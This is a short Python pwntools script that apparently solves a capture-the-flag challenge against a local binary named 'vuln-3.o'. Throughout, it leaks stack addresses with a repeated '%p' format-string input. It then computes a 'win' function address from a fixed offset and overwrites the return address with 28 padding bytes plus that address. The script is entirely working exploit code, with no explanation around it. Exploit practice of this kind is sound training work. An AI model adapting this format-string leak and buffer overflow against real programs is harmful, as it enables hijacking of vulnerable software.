#!/usr/bin/env python3

from pwn import *

p = process('./vuln-3.o')

p.sendline("%p" * 7)

data = p.readline()
data = data.split(b"0x")
for i in range(len(data)):
    log.info("{} {}".format(i, data[i]))

some_addr = int(data[3],16)
offset = 0x37
win_addres = some_addr - offset

log.success("WIN AT: 0x%08x" % win_addres)
send = b"A" * 28 + p32(win_addres)

p.sendline(send)

p.interactive()
